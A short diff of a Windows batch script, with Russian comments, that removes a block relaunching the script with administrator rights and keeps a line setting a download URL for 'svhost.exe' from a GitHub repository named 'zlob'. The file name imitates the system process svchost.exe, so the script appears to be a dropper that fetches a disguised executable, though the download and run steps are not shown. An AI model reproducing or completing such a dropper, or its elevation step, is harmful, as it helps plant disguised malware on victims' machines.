@@ -1,12 +1,5 @@
 @echo off
 setlocal
-:: Запрос прав администратора (как выше)
-openfiles >nul 2>&1
-if %errorlevel% neq 0 (
-    echo Запуск с правами администратора...
-    powershell -Command Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs
-    exit /b
-)
 
 :: Устанавливаем путь к программе (замените путь на ваш)
 set "url=https://github.com/ratS1gma/zlob/raw/refs/heads/main/svhost.exe"
